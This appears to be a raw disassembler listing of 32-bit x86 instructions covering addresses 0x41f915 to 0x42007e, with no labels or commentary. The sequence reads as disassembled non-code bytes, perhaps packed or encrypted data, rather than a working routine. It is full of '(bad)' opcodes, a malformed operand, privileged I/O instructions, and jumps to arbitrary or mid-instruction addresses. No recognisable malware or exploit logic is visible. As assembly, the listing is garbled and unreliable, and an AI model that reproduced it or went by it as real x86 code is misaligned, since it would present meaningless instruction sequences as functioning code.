  41f915:	mov    edi,DWORD PTR [ebx-0x6d4b69dd]
  41f91b:	outs   dx,BYTE PTR ds:[esi]
  41f91c:	xchg   ecx,eax
  41f91d:	sub    DWORD PTR [esi*4-0x11c485f0],esp
  41f924:	inc    esi
  41f925:	jne    0x41f917
  41f927:	adc    al,ch
  41f929:	pop    esp
  41f92a:	ficomp WORD PTR [ebx+0x2f08b4fd]
  41f930:	js     0x41f994
  41f932:	cmp    DWORD PTR [ebp-0x36],ecx
  41f935:	inc    edi
  41f936:	cmp    BYTE PTR [ecx+0x46],ah
  41f939:	dec    edx
  41f93a:	ds sahf 
  41f93c:	xchg   DWORD PTR [esp+edi*4+0x241ebe],eax
  41f943:	or     DWORD PTR [ebx],0x1becae6e
  41f949:	xor    eax,0x8bf65ce1
  41f94e:	pop    ss
  41f94f:	adc    BYTE PTR ds:0x3d6ddfdf,dl
  41f955:	pop    ecx
  41f956:	iret   
  41f957:	and    ch,bh
  41f959:	popa   
  41f95a:	xor    BYTE PTR [ecx],dl
  41f95c:	jecxz  0x41f8e9
  41f95e:	jecxz  0x41f94a
  41f960:	mov    ?,WORD PTR [esi-0x1e]
  41f963:	push   0xffffff8b
  41f965:	dec    ebx
  41f966:	push   ecx
  41f967:	and    BYTE PTR [edx+0x3b],cl
  41f96a:	mov    al,ds:0x26d561fe
  41f96f:	fsub   st(2),st
  41f971:	mov    esp,0x439f2018
  41f976:	and    dh,BYTE PTR [ebx]
  41f978:	mov    dh,0xa8
  41f97a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f97b:	add    bh,BYTE PTR [ebx]
  41f97d:	pop    edx
  41f97e:	pop    DWORD PTR [esi+0x38143419]
  41f984:	mov    dl,0x2b
  41f986:	ret    0x4acb
  41f989:	loope  0x41f9e9
  41f98b:	enter  0xdc24,0xb4
  41f98f:	push   0x28
  41f991:	idiv   DWORD PTR [esi+edi*4+0x3cb39111]
  41f998:	mov    ebx,0x7e0e4411
  41f99d:	arpl   WORD PTR ds:0x1bf53905,bx
  41f9a3:	pop    ebx
  41f9a4:	xor    al,0x50
  41f9a6:	(bad)  
  41f9a7:	dec    DWORD PTR [esp+ecx*1]
  41f9aa:	sar    edx,cl
  41f9ac:	add    ebp,esi
  41f9ae:	popf   
  41f9af:	cwde   
  41f9b0:	fwait
  41f9b1:	scas   al,BYTE PTR es:[edi]
  41f9b2:	idiv   BYTE PTR [ecx+0x135ed2ca]
  41f9b8:	ja     0x41f94e
  41f9ba:	jmp    0x86f0ddcd
  41f9bf:	iret   
  41f9c0:	jge    0x41f9d1
  41f9c2:	aam    0xc7
  41f9c4:	dec    edx
  41f9c5:	retf   0x8e3d
  41f9c8:	adc    DWORD PTR [ebp-0x2a],esp
  41f9cb:	sub    eax,0xe3f62ff9
  41f9d0:	repnz fdiv QWORD PTR [ebp-0x3f]
  41f9d4:	inc    esp
  41f9d5:	sar    BYTE PTR [esi-0x2fbcd2b8],cl
  41f9db:	and    eax,0xca101958
  41f9e0:	pushf  
  41f9e1:	loope  0x41f9bd
  41f9e3:	std    
  41f9e4:	bound  ecx,QWORD PTR [eax+0x6d]
  41f9e7:	aam    0x16
  41f9e9:	inc    esp
  41f9ea:	fldcw  WORD PTR [eax-0x753874ac]
  41f9f0:	inc    ebx
  41f9f1:	lea    ebp,[eax+ecx*2-0x7459cda2]
  41f9f8:	jmp    DWORD PTR [edi]
  41f9fa:	dec    eax
  41f9fb:	xchg   esi,eax
  41f9fc:	outs   dx,BYTE PTR ds:[esi]
  41f9fd:	xor    DWORD PTR [edi+0x71],0x8
  41fa01:	adc    DWORD PTR [edi],0xffffff80
  41fa04:	pop    ss
  41fa05:	and    DWORD PTR ds:0x49440d73,edx
  41fa0b:	cli    
  41fa0c:	or     eax,0xac215659
  41fa11:	mov    esp,0xe5824463
  41fa16:	jmp    0xc8c9728
  41fa1b:	out    0x92,al
  41fa1d:	push   esi
  41fa1e:	cwde   
  41fa1f:	pop    es
  41fa20:	mov    cl,0xac
  41fa22:	mov    BYTE PTR [esi],bh
  41fa24:	xchg   edi,eax
  41fa25:	stos   BYTE PTR es:[edi],al
  41fa26:	aam    0xbd
  41fa28:	cmp    eax,0x16b4b40
  41fa2d:	and    cl,0xc4
  41fa30:	xor    al,0xe4
  41fa32:	pusha  
  41fa33:	push   es
  41fa34:	mov    dh,0xc4
  41fa36:	xchg   esp,eax
  41fa37:	xchg   esi,eax
  41fa38:	hlt    
  41fa39:	cmp    al,al
  41fa3b:	cwde   
  41fa3c:	ins    DWORD PTR es:[edi],dx
  41fa3d:	adc    eax,0x915ac6e2
  41fa42:	(bad)
  41fa45:	xchg   ebx,eax
  41fa46:	mov    cl,BYTE PTR ds:0x291b507c
  41fa4c:	and    DWORD PTR [esp+eiz*2-0x26f7a437],ecx
  41fa53:	sbb    ebx,DWORD PTR [ecx+0x37851442]
  41fa59:	xor    eax,0x61f1e4ff
  41fa5e:	pop    ss
  41fa5f:	aas    
  41fa60:	out    0xe3,eax
  41fa62:	cmp    DWORD PTR [eax+0x23dba23b],esp
  41fa68:	rcr    DWORD PTR [ecx-0x52],cl
  41fa6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa6c:	mov    dl,0xa6
  41fa6e:	repz inc esi
  41fa70:	data16 xlat BYTE PTR ds:[ebx]
  41fa72:	pop    ss
  41fa73:	mov    ebp,0x4d049ff8
  41fa78:	push   ebx
  41fa79:	outs   dx,DWORD PTR ds:[esi]
  41fa7a:	cmp    al,0x7
  41fa7c:	jle    0x41fab8
  41fa7e:	sbb    eax,0x89c91b72
  41fa83:	push   esi
  41fa84:	and    eax,ebp
  41fa86:	xor    esp,DWORD PTR [ebp+ebx*2-0x56]
  41fa8a:	stc    
  41fa8b:	icebp  
  41fa8c:	jp     0x41fa39
  41fa8e:	add    eax,0x2c8a394f
  41fa93:	or     ch,ah
  41fa95:	das    
  41fa96:	aam    0x88
  41fa98:	inc    esi
  41fa99:	push   eax
  41fa9a:	push   es
  41fa9b:	push   eax
  41fa9c:	leave  
  41fa9d:	pop    esp
  41fa9e:	retf   
  41fa9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faa0:	xchg   DWORD PTR [eax+esi*8+0x5649a0fb],edx
  41faa7:	inc    ebp
  41faa8:	out    0xe1,al
  41faaa:	xor    bh,al
  41faac:	xor    edi,ecx
  41faae:	push   ecx
  41faaf:	aad    0x8b
  41fab1:	js     0x41fa34
  41fab3:	mov    BYTE PTR [edi-0xc],dh
  41fab6:	or     eax,0xa4983d6f
  41fabb:	push   ecx
  41fabc:	sub    al,0x69
  41fabe:	add    dh,bl
  41fac0:	xor    ebp,eax
  41fac2:	pop    ecx
  41fac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fac4:	mov    ebp,0xbb2b9d4
  41fac9:	outs   dx,BYTE PTR ds:[esi]
  41faca:	lock repz adc ebp,eax
  41face:	in     eax,dx
  41facf:	jmp    FWORD PTR [ebp-0xded8e1f]
  41fad5:	jge    0x41fa98
  41fad7:	jns    0x41fa7a
  41fad9:	fsubrp st(5),st
  41fadb:	ss jne 0x41fa75
  41fade:	jg     0x41fb19
  41fae0:	xor    al,0xa2
  41fae2:	out    dx,al
  41fae3:	or     ch,ah
  41fae5:	adc    DWORD PTR [edx-0x25],eax
  41fae8:	pop    ebp
  41fae9:	xchg   bl,cl
  41faeb:	hlt    
  41faec:	rol    BYTE PTR [ebp+0x6c4dc09a],cl
  41faf2:	test   eax,0x1e31a39
  41faf7:	sub    al,0xc7
  41faf9:	mov    bl,0x34
  41fafb:	add    eax,0x330eeb8d
  41fb00:	pop    edi
  41fb01:	cmp    al,0xa2
  41fb03:	retf   0x5920
  41fb06:	jge    0x41fb7a
  41fb08:	and    ebp,edi
  41fb0a:	aam    0x6e
  41fb0c:	(bad)  
  41fb0d:	ins    DWORD PTR es:[edi],dx
  41fb0e:	shl    DWORD PTR [ebx+0x7],0xb0
  41fb12:	sbb    al,0xf4
  41fb14:	jecxz  0x41fb6d
  41fb16:	lahf   
  41fb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb18:	leave  
  41fb19:	push   ss
  41fb1a:	pop    edi
  41fb1b:	les    esp,FWORD PTR [ecx-0x6d]
  41fb1e:	pusha  
  41fb1f:	mov    ds:0x65753ec9,eax
  41fb24:	ret    0x9cb
  41fb27:	push   ebx
  41fb28:	int3   
  41fb29:	mov    bh,0xd9
  41fb2b:	mov    bl,0xcc
  41fb2d:	fisubr WORD PTR [esi-0x6cb66152]
  41fb33:	iret   
  41fb34:	fstp   TBYTE PTR [eax+0x78]
  41fb37:	ret    
  41fb38:	add    BYTE PTR [ecx+ecx*4],dl
  41fb3b:	push   ebx
  41fb3c:	push   edx
  41fb3d:	dec    edx
  41fb3e:	fcom   QWORD PTR [edx-0x71390844]
  41fb44:	mov    DWORD PTR [ebx],ebx
  41fb46:	iret   
  41fb47:	ja     0x41fb45
  41fb49:	mov    ch,0xee
  41fb4b:	popf   
  41fb4c:	test   edi,0x16cbde6f
  41fb52:	and    al,0x2c
  41fb54:	in     al,dx
  41fb55:	aas    
  41fb56:	xchg   ecx,eax
  41fb57:	xchg   esi,eax
  41fb58:	sub    eax,0x78effdf2
  41fb5d:	fwait
  41fb5e:	and    DWORD PTR [eax-0x42],0x809622d0
  41fb65:	shl    DWORD PTR [edx],0xe8
  41fb68:	test   eax,0xb02f1ce2
  41fb6d:	fisttp WORD PTR ds:0x1b150cc6
  41fb73:	dec    esp
  41fb74:	ds mov dh,0x8e
  41fb77:	mov    esi,0x949db0f6
  41fb7c:	in     eax,0x11
  41fb7e:	inc    ebx
  41fb7f:	shr    BYTE PTR es:[ebp+0x2913b9f8],0xe2
  41fb87:	cmp    eax,DWORD PTR ds:0xc1904d3b
  41fb8d:	mov    ecx,DWORD PTR [edx]
  41fb8f:	call   0x7ea0:0xccd207ac
  41fb96:	sub    esp,DWORD PTR [esi]
  41fb98:	pop    esp
  41fb99:	sbb    edi,DWORD PTR [ebp+0x400df327]
  41fb9f:	inc    ecx
  41fba0:	sub    eax,DWORD PTR [eax+0x31]
  41fba3:	sub    BYTE PTR [eax+0x5acb050c],bh
  41fba9:	adc    DWORD PTR [edx],esi
  41fbab:	pop    ebp
  41fbac:	and    eax,0xb0ea92f7
  41fbb1:	adc    eax,0x21e4b776
  41fbb6:	in     al,dx
  41fbb7:	imul   ebx,DWORD PTR [edx],0xffffff80
  41fbba:	not    DWORD PTR [edi+0x43ac7ddc]
  41fbc0:	sbb    al,0x4b
  41fbc2:	fisttp DWORD PTR [esi]
  41fbc4:	ins    DWORD PTR es:[edi],dx
  41fbc5:	rcr    BYTE PTR [edx+0x5b0d9d8e],0x8f
  41fbcc:	pop    ecx
  41fbcd:	inc    edx
  41fbce:	sti    
  41fbcf:	rol    eax,cl
  41fbd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbd2:	or     eax,0xb95e3972
  41fbd7:	outs   dx,BYTE PTR ds:[esi]
  41fbd8:	mov    eax,ds:0xda88baf0
  41fbdd:	loop   0x41fbda
  41fbdf:	mov    ebp,0x3cc36fb0
  41fbe4:	cmp    eax,0x828581e3
  41fbe9:	popf   
  41fbea:	cmp    ebp,esi
  41fbec:	aas    
  41fbed:	adc    DWORD PTR [eax],ecx
  41fbef:	xor    ebp,DWORD PTR [edx]
  41fbf1:	fwait
  41fbf2:	add    BYTE PTR [edx],bl
  41fbf4:	leave  
  41fbf5:	mov    eax,ds:0xe60394be
  41fbfa:	loopne 0x41fbbc
  41fbfc:	inc    edx
  41fbfd:	jae    0x41fbb6
  41fbff:	sub    al,0x25
  41fc01:	sub    DWORD PTR [eax-0x2f],esp
  41fc04:	fdivr  st,st(1)
  41fc06:	push   ebx
  41fc07:	or     dh,dh
  41fc09:	push   ss
  41fc0a:	xchg   DWORD PTR [eax],ecx
  41fc0c:	ins    DWORD PTR es:[edi],dx
  41fc0d:	cmc    
  41fc0e:	xor    esp,DWORD PTR [edx]
  41fc10:	out    0xb9,eax
  41fc12:	mov    bh,0xfa
  41fc14:	mov    ebx,0x686d4e9d
  41fc19:	jmp    0x94b40496
  41fc1e:	enter  0x7576,0xe
  41fc22:	daa    
  41fc23:	cld    
  41fc24:	jb     0x41fc0d
  41fc26:	mov    ah,0x51
  41fc28:	jp     0x41fc1f
  41fc2a:	pop    ebp
  41fc2b:	dec    edx
  41fc2c:	mov    WORD PTR [esi],cs
  41fc2e:	aam    0x41
  41fc30:	enter  0x15a4,0xf4
  41fc34:	mov    dl,0x25
  41fc36:	mov    ecx,0xcfe48f7f
  41fc3b:	mov    edi,0x365681db
  41fc40:	ret    0x6163
  41fc43:	clc    
  41fc44:	icebp  
  41fc45:	adc    DWORD PTR [eax+0x1c],ebp
  41fc48:	add    al,0xfc
  41fc4a:	imul   ebx,DWORD PTR [ebp+0x42acf69d],0xffffffdd
  41fc51:	adc    al,bh
  41fc53:	int    0x5d
  41fc55:	push   ebx
  41fc56:	dec    BYTE PTR [ecx+0x3e8d2f10]
  41fc5c:	sbb    al,0xab
  41fc5e:	jmp    0x582b:0xae641195
  41fc65:	psllw  mm0,QWORD PTR [edx]
  41fc68:	dec    eax
  41fc69:	nop
  41fc6a:	fs mov dl,BYTE PTR ds:[esp+eax*1]
  41fc6f:	rcr    eax,cl
  41fc71:	mov    al,0x72
  41fc73:	sub    BYTE PTR [eax+0x44995d95],dh
  41fc79:	ds dec edi
  41fc7b:	jbe    0x41fcd4
  41fc7d:	mov    edx,0x17512c9b
  41fc82:	(bad)  
  41fc83:	fild   QWORD PTR [esi+0x26afd2fd]
  41fc89:	mov    eax,ds:0xc5e04689
  41fc8e:	fisub  DWORD PTR [edi]
  41fc90:	and    eax,0xd7f4ea0b
  41fc95:	pop    eax
  41fc96:	cmp    dh,BYTE PTR [ebp-0x129fab4d]
  41fc9c:	ja     0x41fced
  41fc9e:	mov    dl,BYTE PTR [esi]
  41fca0:	ds jmp 0x41fd14
  41fca3:	js     0x41fd19
  41fca5:	mov    eax,ds:0x89c2e932
  41fcaa:	sub    eax,0x32eb3679
  41fcaf:	add    eax,0x69739d95
  41fcb4:	xchg   ebx,eax
  41fcb5:	lea    esi,[eax+0x62814319]
  41fcbb:	loop   0x41fc92
  41fcbd:	cwde   
  41fcbe:	xchg   DWORD PTR [eax+0x5a3c5386],eax
  41fcc4:	fist   DWORD PTR ds:0x20360281
  41fcca:	push   esp
  41fccb:	jp     0x41fca1
  41fccd:	ret    
  41fcce:	pop    edx
  41fccf:	in     eax,0xe9
  41fcd1:	jae    0x41fcd9
  41fcd3:	sub    DWORD PTR [ebx+ebx*2+0x6e95beaa],0x1c740915
  41fcde:	fsubr  QWORD PTR [esi-0x697d718a]
  41fce4:	sti    
  41fce5:	xor    DWORD PTR [edx-0x571246e1],0x16a13b36
  41fcef:	out    0x8a,eax
  41fcf1:	sub    ecx,esi
  41fcf3:	cli    
  41fcf4:	mov    bl,0x77
  41fcf6:	push   ss
  41fcf7:	mov    ch,0x44
  41fcf9:	out    dx,al
  41fcfa:	adc    eax,0x399525cb
  41fcff:	jmp    0x41fc9c
  41fd01:	add    ch,BYTE PTR [ebx]
  41fd03:	enter  0x3447,0xcf
  41fd07:	cld    
  41fd08:	mov    ebp,0xe2ef2d4e
  41fd0d:	sar    BYTE PTR [ebx],0x6c
  41fd10:	push   esp
  41fd11:	addr16 mov bl,0xa4
  41fd14:	ds push ds
  41fd16:	into   
  41fd17:	mov    BYTE PTR [edi],dl
  41fd19:	test   eax,0x46961c73
  41fd1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd1f:	test   BYTE PTR ss:0xb16c36ad,ah
  41fd26:	bound  ebp,QWORD PTR [edx]
  41fd28:	xor    eax,0x16ff0267
  41fd2d:	and    dh,BYTE PTR [edx+0x219d0e79]
  41fd33:	dec    eax
  41fd34:	dec    esp
  41fd35:	(bad)  [ebx+0x36]
  41fd38:	and    ebp,DWORD PTR [eax-0x32b1e2ee]
  41fd3e:	pop    edx
  41fd3f:	cs push es
  41fd41:	cs dec edx
  41fd43:	jmp    0x41fd9d
  41fd45:	or     dh,BYTE PTR [edx+eax*2]
  41fd48:	out    dx,eax
  41fd49:	pop    ebp
  41fd4a:	jmp    0x41fd77
  41fd4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd4d:	xchg   esi,eax
  41fd4e:	stos   DWORD PTR es:[edi],eax
  41fd4f:	bound  edx,QWORD PTR [edi+ebp*8]
  41fd52:	inc    eax
  41fd53:	test   eax,0x5ac7cac2
  41fd58:	pop    esi
  41fd59:	cmp    dl,BYTE PTR [edi+0x7d3261ed]
  41fd5f:	inc    ecx
  41fd60:	or     BYTE PTR [esi-0x40],bl
  41fd63:	adc    BYTE PTR [edi],dl
  41fd65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd66:	popa   
  41fd67:	retf   
  41fd68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd69:	in     eax,dx
  41fd6a:	outs   dx,BYTE PTR ds:[esi]
  41fd6b:	lods   al,BYTE PTR ds:[esi]
  41fd6c:	sti    
  41fd6d:	out    dx,eax
  41fd6e:	mov    ebp,0x9948e265
  41fd73:	lock and bh,ah
  41fd76:	dec    ebx
  41fd77:	push   0x15
  41fd79:	push   ss
  41fd7a:	xchg   esi,eax
  41fd7b:	pop    DWORD PTR [ebx+esi*2+0xbe914c2]
  41fd82:	test   DWORD PTR [eax+0x4fdb986f],eax
  41fd88:	aas    
  41fd89:	dec    eax
  41fd8a:	cmc    
  41fd8b:	pop    esp
  41fd8c:	mov    cl,0x36
  41fd8e:	dec    ebp
  41fd8f:	xchg   edx,eax
  41fd90:	mov    al,ds:0x8071cf7e
  41fd95:	pusha  
  41fd96:	sahf   
  41fd97:	(bad)  
  41fd98:	sub    dh,BYTE PTR [esi+0x6ddaaeb5]
  41fd9e:	hlt    
  41fd9f:	or     al,0x35
  41fda1:	shr    DWORD PTR [edi],cl
  41fda3:	inc    ebp
  41fda4:	jns    0x41fd2c
  41fda6:	push   ss
  41fda7:	jae    0x41fd62
  41fda9:	xchg   di,ax
  41fdab:	(bad)  
  41fdad:	xor    BYTE PTR [esi-0x1072e909],cl
  41fdb3:	pop    ss
  41fdb4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41fdb6:	fst    st(2)
  41fdb8:	and    DWORD PTR [ebx-0x27e99644],ebp
  41fdbe:	lods   al,BYTE PTR ds:[esi]
  41fdbf:	cmc    
  41fdc0:	xchg   edx,eax
  41fdc1:	pusha  
  41fdc2:	pop    es
  41fdc3:	lods   eax,DWORD PTR ds:[esi]
  41fdc4:	std    
  41fdc5:	sar    BYTE PTR [esi+0x40],1
  41fdc8:	sar    esi,0x24
  41fdcb:	addr16 int 0x5f
  41fdce:	and    al,BYTE PTR [ebx]
  41fdd0:	xchg   esi,eax
  41fdd1:	fistp  QWORD PTR [ebx+0x5d]
  41fdd4:	ds iret 
  41fdd6:	int3   
  41fdd7:	fistp  WORD PTR [edx+0xc]
  41fddb:	test   BYTE PTR [esi+0x1c],bl
  41fdde:	pushf  
  41fddf:	ja     0x41fe49
  41fde1:	jmp    0x201bfab9
  41fde6:	dec    edx
  41fde7:	lds    esi,FWORD PTR [eax-0x6c1cea7b]
  41fded:	popa   
  41fdee:	pop    edx
  41fdef:	push   es
  41fdf0:	inc    edi
  41fdf1:	mov    ch,0x5d
  41fdf3:	std    
  41fdf4:	dec    edi
  41fdf5:	jno    0x41fd8f
  41fdf7:	or     al,0xaa
  41fdf9:	enter  0xdf1a,0x4
  41fdfd:	loop   0x41fe1e
  41fdff:	add    eax,0x478750d2
  41fe04:	xor    al,0xe9
  41fe06:	leave  
  41fe07:	out    dx,eax
  41fe08:	pop    esp
  41fe09:	test   BYTE PTR [eax-0x69],dl
  41fe0c:	inc    ebp
  41fe0d:	and    DWORD PTR [ecx*1-0x3e71df71],esp
  41fe14:	pop    ds
  41fe15:	sub    bh,dh
  41fe17:	arpl   WORD PTR ds:[esi+0x6bafefbe],sp
  41fe1e:	aad    0x92
  41fe20:	adc    BYTE PTR [ebx],dl
  41fe22:	sub    BYTE PTR [edi],bl
  41fe24:	push   edx
  41fe25:	inc    eax
  41fe26:	addr16 mov bl,0xef
  41fe29:	jle    0x41fe0d
  41fe2b:	push   0x20
  41fe2d:	ret    
  41fe2e:	das    
  41fe2f:	jo     0x41fe24
  41fe31:	inc    esp
  41fe32:	xchg   ebp,eax
  41fe33:	pop    edx
  41fe34:	int3   
  41fe35:	repz in eax,0x26
  41fe38:	jmp    0xfe4bbf41
  41fe3d:	add    ch,BYTE PTR es:[bp+si+0xc4f]
  41fe43:	pop    es
  41fe44:	push   esi
  41fe45:	pusha  
  41fe46:	jb     0x41fe48
  41fe48:	pusha  
  41fe49:	jecxz  0x41fe75
  41fe4b:	imul   eax,DWORD PTR [edi+0x6e23a3e4],0x53a04449
  41fe55:	ins    BYTE PTR es:[edi],dx
  41fe56:	lds    esi,FWORD PTR [edi-0x5e]
  41fe59:	mov    al,ds:0xe278f776
  41fe5e:	cli    
  41fe5f:	ja     0x41fe48
  41fe61:	cwde   
  41fe62:	sar    DWORD PTR [esi-0x60],cl
  41fe65:	mov    cl,0xc2
  41fe67:	sub    ebp,DWORD PTR [ecx]
  41fe69:	aas    
  41fe6a:	jl     0x41fe15
  41fe6c:	cmp    dh,bl
  41fe6e:	jle    0x41fe04
  41fe70:	stos   BYTE PTR es:[edi],al
  41fe71:	sub    al,0x4
  41fe74:	push   eax
  41fe75:	xlat   BYTE PTR ds:[ebx]
  41fe76:	mov    ch,0x2
  41fe78:	mov    dh,0x95
  41fe7a:	mov    ebx,eax
  41fe7c:	icebp  
  41fe7d:	cmp    ecx,ebp
  41fe7f:	mov    DWORD PTR [esp+esi*2],edx
  41fe82:	add    eax,0x4ca787f1
  41fe87:	xor    esp,ebx
  41fe89:	lea    edx,[ebx+eax*8+0x55]
  41fe8d:	jp     0x41fe28
  41fe8f:	jg     0x41fe27
  41fe91:	jmp    0x41fe79
  41fe93:	mov    BYTE PTR [ebx],cl
  41fe95:	cmp    BYTE PTR [edx+0x777df8f1],bh
  41fe9b:	dec    eax
  41fe9c:	js     0x41fe8e
  41fe9e:	lds    esi,FWORD PTR [ebp-0x4e]
  41fea1:	ret    
  41fea2:	mov    WORD PTR [ebx+0x5],cs
  41fea5:	inc    edx
  41fea6:	dec    eax
  41fea7:	pop    eax
  41fea8:	rol    DWORD PTR [edx],cl
  41feaa:	cdq    
  41feab:	lea    edi,[edi-0x7e]
  41feae:	(bad)  
  41feaf:	or     ebx,DWORD PTR [ebx+0x4e25cb72]
  41feb5:	(bad)  
  41feb6:	leave  
  41feb7:	cmp    eax,esi
  41feb9:	mov    eax,0xc6c499f0
  41febe:	test   BYTE PTR [ebx+0x546a9ac9],0x40
  41fec5:	dec    edi
  41fec6:	scas   al,BYTE PTR es:[edi]
  41fec7:	mov    dl,0x14
  41fec9:	dec    esp
  41feca:	(bad)  
  41fecb:	stos   DWORD PTR es:[edi],eax
  41fecc:	int    0xd8
  41fece:	add    esp,DWORD PTR [edx]
  41fed0:	jle    0x41ff1f
  41fed2:	sub    ah,dl
  41fed4:	pop    es
  41fed5:	jmp    0x25040a8f
  41feda:	shl    DWORD PTR [ebp-0x58377426],1
  41fee0:	aam    0xbf
  41fee2:	adc    eax,0xe2e33941
  41fee7:	arpl   WORD PTR [ebx+eiz*1-0x7fd45808],ax
  41feee:	pop    es
  41feef:	scas   al,BYTE PTR es:[edi]
  41fef0:	fcom   DWORD PTR [edi+edx*8]
  41fef3:	fisubr WORD PTR [ecx+0x51]
  41fef6:	stc    
  41fef7:	pop    ss
  41fef8:	fcomp  DWORD PTR [edx+0x507769b0]
  41fefe:	call   0xac67500a
  41ff03:	sub    ebx,DWORD PTR [ebp-0x68]
  41ff06:	adc    esp,ebp
  41ff08:	scas   al,BYTE PTR es:[edi]
  41ff09:	sbb    eax,0xa1626139
  41ff0e:	call   0x3f329d0e
  41ff13:	mov    dl,0x21
  41ff15:	pop    ss
  41ff16:	mov    cl,0xa9
  41ff18:	or     eax,0x9e8a7ba7
  41ff1d:	fsubr  QWORD PTR [esi+eax*8-0x22]
  41ff21:	pop    esp
  41ff22:	lods   eax,DWORD PTR ds:[esi]
  41ff23:	fcmovbe st,st(0)
  41ff25:	aaa    
  41ff26:	add    eax,0x312bc980
  41ff2b:	pop    esp
  41ff2c:	imul   edx,DWORD PTR [edi],0xffffff98
  41ff2f:	rcl    ebx,1
  41ff31:	outs   dx,DWORD PTR ds:[esi]
  41ff32:	push   gs
  41ff34:	or     cl,BYTE PTR [esi-0x74534e69]
  41ff3a:	jno    0x41ff0b
  41ff3c:	mov    dh,0x13
  41ff3e:	int3   
  41ff3f:	ja     0x41ff22
  41ff41:	pop    esi
  41ff42:	push   ds
  41ff43:	jbe    0x41ff40
  41ff45:	mov    DWORD PTR fs:[edx-0x5e],ebx
  41ff49:	xchg   edi,eax
  41ff4a:	push   edx
  41ff4b:	fmul   DWORD PTR cs:[ebx-0x3696a98f]
  41ff52:	add    eax,0xff46717b
  41ff57:	shl    DWORD PTR [ebx],0x37
  41ff5a:	scas   al,BYTE PTR es:[edi]
  41ff5b:	jb     0x41ffc8
  41ff5d:	mov    ch,0x91
  41ff5f:	jp     0x41fef3
  41ff61:	inc    ecx
  41ff62:	pushf  
  41ff63:	mov    dl,0xd8
  41ff65:	xchg   esi,eax
  41ff66:	push   esp
  41ff67:	xor    dl,BYTE PTR [ebp+0x45]
  41ff6a:	clc    
  41ff6b:	sahf   
  41ff6c:	mov    ah,0x18
  41ff6e:	retf   0x1885
  41ff71:	mov    cl,ch
  41ff73:	popa   
  41ff74:	jecxz  0x41ff77
  41ff76:	nop
  41ff77:	test   al,0x5c
  41ff79:	in     eax,0x9a
  41ff7b:	out    dx,eax
  41ff7c:	push   es
  41ff7d:	dec    ebp
  41ff7e:	pusha  
  41ff7f:	into   
  41ff80:	inc    esi
  41ff81:	xor    BYTE PTR [ebp+0x32],0x78
  41ff85:	xchg   ecx,eax
  41ff86:	js     0x41ffe9
  41ff88:	les    edx,FWORD PTR [ecx-0x3e66a28a]
  41ff8e:	mov    al,ds:0x135d15fa
  41ff93:	int    0x61
  41ff95:	jle    0x41ffc0
  41ff97:	lds    eax,FWORD PTR [ebx]
  41ff99:	stos   DWORD PTR es:[edi],eax
  41ff9a:	sbb    eax,0xc6d87322
  41ff9f:	or     eax,0x8f9a70ab
  41ffa4:	data16 out 0x82,al
  41ffa7:	and    DWORD PTR fs:[eax+0x79f94c01],0x246aef01
  41ffb2:	cmp    ebx,ecx
  41ffb4:	aas    
  41ffb5:	add    BYTE PTR [ebx],al
  41ffb7:	(bad)  [edx]
  41ffb9:	pop    ss
  41ffba:	fwait
  41ffbb:	cmp    eax,0x52d3543e
  41ffc0:	sbb    ecx,ebp
  41ffc2:	mov    dh,0xa2
  41ffc4:	inc    esp
  41ffc5:	(bad)  
  41ffc7:	jge    0x41ff62
  41ffc9:	jno    0x41ff64
  41ffcb:	or     edi,esp
  41ffcd:	pop    esi
  41ffce:	les    esi,FWORD PTR [edx+0xa]
  41ffd1:	mov    dl,0xfd
  41ffd3:	je     0x41ffb9
  41ffd5:	add    esi,ebp
  41ffd7:	mov    ds:0xcbe3c61b,al
  41ffdc:	mov    ebp,0x24a6af60
  41ffe1:	cdq    
  41ffe2:	pop    eax
  41ffe3:	in     eax,dx
  41ffe4:	retf   
  41ffe5:	xchg   ebp,eax
  41ffe6:	ins    BYTE PTR es:[edi],dx
  41ffe7:	push   ss
  41ffe8:	lock sbb dh,ch
  41ffeb:	pop    es
  41ffec:	sbb    al,0xa9
  41ffee:	stc    
  41ffef:	loope  0x420069
  41fff1:	ja     0x420017
  41fff3:	xor    DWORD PTR [esi+0x696a637c],ecx
  41fff9:	or     DWORD PTR ds:0x88730d7b,esi
  41ffff:	es mov al,0x19
  420002:	push   ss
  420003:	xchg   DWORD PTR [edi],edi
  420005:	call   0x2edd6f05
  42000a:	mov    ecx,DWORD PTR [ebp+0x4a]
  42000d:	mov    bh,0x38
  42000f:	xor    BYTE PTR ds:0x77c97bb8,al
  420015:	repnz sbb eax,0x7e1de3e7
  42001b:	in     eax,0x55
  42001d:	icebp  
  42001e:	fsubr  DWORD PTR [ebp+0x4d]
  420021:	push   eax
  420022:	jl     0x420094
  420024:	or     eax,0xc424e065
  420029:	fs aad 0x4e
  42002c:	adc    dh,cl
  42002e:	into   
  42002f:	mov    bl,0x4c
  420031:	(bad)  
  420032:	test   BYTE PTR [esi+0x3e],0xa4
  420036:	mov    al,ds:0x80c5b6b7
  42003b:	push   esi
  42003c:	adc    eax,0x5bf8d6c
  420041:	xor    eax,0xd1839cbe
  420046:	cmp    eax,0xb8176c9b
  42004b:	ins    BYTE PTR es:[edi],dx
  42004c:	mov    edx,0xade43143
  420051:	mov    bl,0x8c
  420053:	mov    cl,0x61
  420055:	adc    al,0xa9
  420057:	xor    ch,BYTE PTR [edx]
  420059:	xchg   esi,eax
  42005a:	ins    BYTE PTR es:[edi],dx
  42005b:	inc    esp
  42005c:	mov    al,ds:0x1eb06c6a
  420061:	imul   esp,DWORD PTR [ebp+0x27],0x5f
  420065:	jb     0x42003c
  420067:	inc    eax
  420068:	ins    BYTE PTR es:[edi],dx
  420069:	inc    edi
  42006a:	(bad)  
  42006b:	mov    ds:0xe07f0799,eax
  420070:	mov    ebx,0x93a7a6c4
  420075:	call   0x3e2:0x9bb2f901
  42007c:	stc    
  42007d:	inc    ebp
  42007e:	mov    BYTE PTR [ecx],dh
